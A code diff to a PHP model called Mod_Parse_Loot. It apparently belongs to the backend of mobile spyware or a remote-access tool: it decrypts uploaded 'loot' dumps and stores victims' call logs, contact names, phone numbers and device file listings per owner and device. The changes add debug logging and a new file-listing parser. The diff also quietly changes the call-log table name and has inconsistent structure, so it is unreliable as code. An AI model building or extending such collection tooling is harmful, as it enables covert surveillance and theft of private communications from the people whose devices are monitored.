@@ -121,20 +121,38 @@ class Mod_Parse_Loot extends Model
             }
 
             $json = json_decode($loot_decoded, true);
-            if ($json === null || !isset($json['call_logs']) || !is_array($json['call_logs'])) {
-                log_message('error', 'Invalid JSON structure in call logs file: ' . $file_name);
-                return false;
-            }
+        if ($json === null || !isset($json['call_logs']) || !is_array($json['call_logs'])) {
+            log_message('error', 'Invalid JSON structure in call logs file: ' . $file_name);
+            log_message('debug', 'JSON keys found: ' . implode(', ', array_keys($json ?? [])));
+            log_message('debug', 'Expected key: call_logs');
+            return false;
+        }
 
             $extracted_at = $json['extracted_at'] ?? null;
 
             $batchData = [];
-            foreach ($json['call_logs'] as $log) {
-                if (!isset($log['phone_number']) || !isset($log['call_date'])) {
-                    continue; // Skip invalid
-                }
+        $skippedCount = 0;
+        $duplicateCount = 0;
+        
+        log_message('info', 'Processing ' . count($json['call_logs']) . ' call logs from ' . $file_name);
+        
+        foreach ($json['call_logs'] as $log) {
+            if (!isset($log['phone_number']) || !isset($log['call_date'])) {
+                $skippedCount++;
+                log_message('debug', 'Skipped call log - missing required fields: ' . json_encode($log));
+                continue; // Skip invalid
+            }
 
-                $call_date = date('Y-m-d H:i:s', substr($log['call_date'], 0, -3)); // Convert ms to seconds
+                if (is_numeric($log['call_date'])) {
+                     // Check if it's milliseconds (length > 10 usually means ms)
+                     if (strlen((string)$log['call_date']) > 10) {
+                        $call_date = date('Y-m-d H:i:s', substr((string)$log['call_date'], 0, 10)); 
+                     } else {
+                        $call_date = date('Y-m-d H:i:s', $log['call_date']);
+                     }
+                } else {
+                    $call_date = $log['call_date'];
+                }
 
                 $logData = [
                     'contact_name'       => $log['contact_name'] ?? null,
@@ -160,14 +178,21 @@ class Mod_Parse_Loot extends Model
                         ->countAllResults() > 0;
 
                 if (!$exists) {
-                    $batchData[] = $logData;
-                }
+                $batchData[] = $logData;
+            } else {
+                $duplicateCount++;
+                log_message('debug', 'Duplicate call log detected: ' . $logData['phone_number'] . ' at ' . $logData['call_date']);
             }
+        }
 
-            if (!empty($batchData)) {
-                $this->db->table('tbl_CallLogs')->insertBatch($batchData);
-                log_message('info', 'Batch inserted ' . count($batchData) . ' call logs from ' . $file_name);
-            }
+        log_message('info', 'Call logs processing summary - Total: ' . count($json['call_logs']) . ', Skipped: ' . $skippedCount . ', Duplicates: ' . $duplicateCount . ', New: ' . count($batchData));
+
+        if (!empty($batchData)) {
+            $this->db->table('tbl_logs')->insertBatch($batchData);
+            log_message('info', 'Batch inserted ' . count($batchData) . ' call logs from ' . $file_name);
+        } else {
+            log_message('warning', 'No new call logs to insert from ' . $file_name);
+        }
 
             return true;
         } catch (\Exception $e) {
@@ -442,6 +467,101 @@ class Mod_Parse_Loot extends Model
                 'error',
                 'get_sms parse error for ' . $file_name . ': ' . $e->getMessage()
             );
+            return false;
+        }
+    }
+
+    /**
+     * Parses and inserts device files from modern JSON file (with batch insert).
+     *
+     * @param string $file_name
+     * @param int $var_file_owner
+     * @param string $var_file_print
+     * @param int|null $fileRecordId
+     * @return bool|int Record count or false
+     */
+    public function get_files(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated = date('Y-m-d H:i:s');
+
+            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($loot_data === false) {
+                log_message('error', 'Failed to read file: ' . $file_name);
+                return false;
+            }
+
+            $loot_decoded = $cryptModel->decode_content($loot_data);
+            if ($loot_decoded === false) {
+                log_message('error', 'Failed to decode file: ' . $file_name);
+                return false;
+            }
+
+            $json = json_decode($loot_decoded, true);
+            if ($json === null || !isset($json['files']) || !is_array($json['files'])) {
+                log_message('error', 'Invalid JSON structure in files file: ' . $file_name);
+                return false;
+            }
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $batchData = [];
+
+            foreach ($json['files'] as $file) {
+                if (!isset($file['path'])) {
+                    continue; // Skip invalid entries
+                }
+
+                $data = [
+                    'name'           => $file['name'] ?? basename($file['path']),
+                    'path'           => $file['path'],
+                    'is_directory'   => isset($file['is_directory']) && $file['is_directory'] ? 1 : 0,
+                    'size_bytes'     => $file['size_bytes'] ?? 0,
+                    'last_modified'  => $file['last_modified'] ?? null,
+                    'extension'      => $file['extension'] ?? null,
+                    'formatted_size' => $file['formatted_size'] ?? null,
+                    'formatted_date' => $file['formatted_date'] ?? null,
+                    'category'       => $file['category'] ?? null,
+                    'owner_id'       => $var_file_owner,
+                    'device_id'      => $var_file_print,
+                    'extracted_at'   => $extracted_at,
+                    'created_at'     => $dated,
+                    'updated_at'     => $dated,
+                ];
+
+                // Duplicate check: Same path, device, and owner
+                $exists = $this->db->table('tbl_device_files')
+                        ->where('path', $data['path'])
+                        ->where('device_id', $data['device_id'])
+                        ->where('owner_id', $data['owner_id'])
+                        ->countAllResults() > 0;
+
+                if (!$exists) {
+                    $batchData[] = $data;
+                } else {
+                    // Start Update existing file info
+                     $this->db->table('tbl_device_files')
+                        ->where('path', $data['path'])
+                        ->where('device_id', $data['device_id'])
+                        ->where('owner_id', $data['owner_id'])
+                        ->update([
+                            'size_bytes'     => $data['size_bytes'],
+                            'last_modified'  => $data['last_modified'],
+                            'formatted_size' => $data['formatted_size'],
+                            'formatted_date' => $data['formatted_date'],
+                            'updated_at'     => $dated,
+                        ]); 
+                }
+            }
+
+            if (!empty($batchData)) {
+                $this->db->table('tbl_device_files')->insertBatch($batchData);
+                log_message('info', 'Batch inserted ' . count($batchData) . ' files from ' . $file_name);
+            }
+
+            return count($batchData); // Return count similar to other methods
+        } catch (\Exception $e) {
+            log_message('error', 'get_files parse error for ' . $file_name . ': ' . $e->getMessage());
             return false;
         }
     }
